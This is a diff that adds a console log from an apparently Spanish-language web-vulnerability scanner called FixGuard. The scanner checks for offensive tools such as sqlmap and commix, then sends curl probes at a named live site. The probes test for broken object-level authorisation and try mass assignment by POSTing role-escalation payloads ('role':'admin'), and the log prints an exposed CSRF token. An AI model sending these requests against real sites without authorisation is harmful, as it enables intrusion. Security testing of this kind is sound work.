@@ -1,0 +1,91 @@
+
+> worker@1.0.0 dev
+> tsx watch src/index.ts
+
+🚀 FixGuard OSINT Worker ejecutándose en http://localhost:4000
+==========================================
+   FixGuard Arsenal Readiness Checker     
+==========================================
+[+] nuclei ... OK
+[+] dalfox ... OK
+[-] Falta gau!
+    -> Ejecuta: brew install gau
+[+] sqlmap ... OK
+[+] nmap ... OK
+[-] Falta semgrep!
+    -> Ejecuta: brew install semgrep
+[+] amass ... OK
+[-] Falta shodan!
+    -> Ejecuta: easy_install shodan
+[+] httpx ... OK
+[-] Falta whatweb!
+    -> Ejecuta: brew install whatweb
+[-] Falta wappalyzer!
+    -> Ejecuta: npm i -g wappalyzer
+[+] feroxbuster ... OK
+[-] Falta gospider!
+    -> Ejecuta: go install github.com/jaeles-project/gospider@latest
+[+] trufflehog ... OK
+[+] gitleaks ... OK
+[+] source-map-explorer ... OK
+[+] retire ... OK
+[-] Falta shcheck!
+    -> Ejecuta: pip install shcheck
+[-] Falta commix!
+    -> Ejecuta: brew install commix
+[-] Falta nosqlmap!
+    -> Ejecuta: git clone https://github.com/codingo/NoSQLMap.git
+[-] Falta crlfuzz!
+    -> Ejecuta: go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
+[-] Falta kxss!
+    -> Ejecuta: go install github.com/Emoe/kxss@latest
+
+[!] Advertencia: Algunas herramientas de tu arsenal no están instaladas.
+[!] FixGuard funcionará, pero algunos ataques o motores SAST fallarán si no instalas estas dependencias.
+
+[Scan 244] Iniciando ataque dirigido REAL [bola_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/session
+[Scan 244] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X GET https://balbuenabarber.vercel.app/api/auth/session
+[Scan 244] 📄 Output recibido (Longitud: 805 bytes)
+[Scan 244] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 245] Iniciando ataque dirigido REAL [bola_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/providers
+[Scan 245] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X GET https://balbuenabarber.vercel.app/api/auth/providers
+[Scan 245] 📄 Output recibido (Longitud: 878 bytes)
+[Scan 245] 🚨 VULNERABILIDAD CONFIRMADA: LOW
+[IssueManager] New finding registered: [LOW] Auth providers expuestos sin autenticación: {"google":{"id":"google","name":"Google","type":"oauth","signinUrl":"https://balbuenabarber.vercel.app/api/auth/signin/google","callbackUrl":"https://balbuenabarber.vercel.app/api/auth/callback/google"},"credentials":{"id":"credentials","name":"credentials","type":"credentials","signinUrl":"https://
+[Scan 246] Iniciando ataque dirigido REAL [bola_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/csrf
+[Scan 246] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X GET https://balbuenabarber.vercel.app/api/auth/csrf
+[Scan 246] 📄 Output recibido (Longitud: 883 bytes)
+[Scan 246] 🚨 VULNERABILIDAD CONFIRMADA: MEDIUM
+[IssueManager] New finding registered: [MEDIUM] CSRF token expuesto sin autenticación. Token: {"csrfToken":"5afd5e1d0ad4b21b90c62db48d6ebc6cbb903c8c4aab13548d73fef625142b82"}
+[Scan 247] Iniciando ataque dirigido REAL [bola_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/signin/google
+[Scan 247] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X GET https://balbuenabarber.vercel.app/api/auth/signin/google
+[Scan 247] 📄 Output recibido (Longitud: 850 bytes)
+[Scan 247] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 248] Iniciando ataque dirigido REAL [mass_assignment_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/session
+[Scan 248] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/api/auth/session
+[Scan 248] 📄 Output recibido (Longitud: 795 bytes)
+[Scan 248] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 249] Iniciando ataque dirigido REAL [mass_assignment_L2xvZ2lu] contra https://balbuenabarber.vercel.app/login
+[Scan 249] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/login
+[Scan 249] 📄 Output recibido (Longitud: 390 bytes)
+[Scan 249] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 250] Iniciando ataque dirigido REAL [mass_assignment_L3JlZ2lzdG] contra https://balbuenabarber.vercel.app/register
+[Scan 250] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/register
+[Scan 250] 📄 Output recibido (Longitud: 393 bytes)
+[Scan 250] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 251] Iniciando ataque dirigido REAL [mass_assignment_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/providers
+[Scan 251] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/api/auth/providers
+[Scan 251] 📄 Output recibido (Longitud: 507 bytes)
+[Scan 251] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 252] Iniciando ataque dirigido REAL [mass_assignment_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/csrf
+[Scan 252] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/api/auth/csrf
+[Scan 252] 📄 Output recibido (Longitud: 507 bytes)
+[Scan 252] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 253] Iniciando ataque dirigido REAL [mass_assignment_L2FwaS9hdX] contra https://balbuenabarber.vercel.app/api/auth/signin/google
+[Scan 253] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/api/auth/signin/google
+[Scan 253] 📄 Output recibido (Longitud: 830 bytes)
+[Scan 253] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
+[Scan 254] Iniciando ataque dirigido REAL [mass_assignment_L2FwaS9wcm] contra https://balbuenabarber.vercel.app/api/products
+[Scan 254] ⚙️ Ejecutando herramienta profesional CLI: curl -i -s -k -X POST -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}' https://balbuenabarber.vercel.app/api/products
+[Scan 254] 📄 Output recibido (Longitud: 449 bytes)
+[Scan 254] ✅ El objetivo parece estar seguro contra este vector (Ninguna coincidencia crítica en la salida de la herramienta).
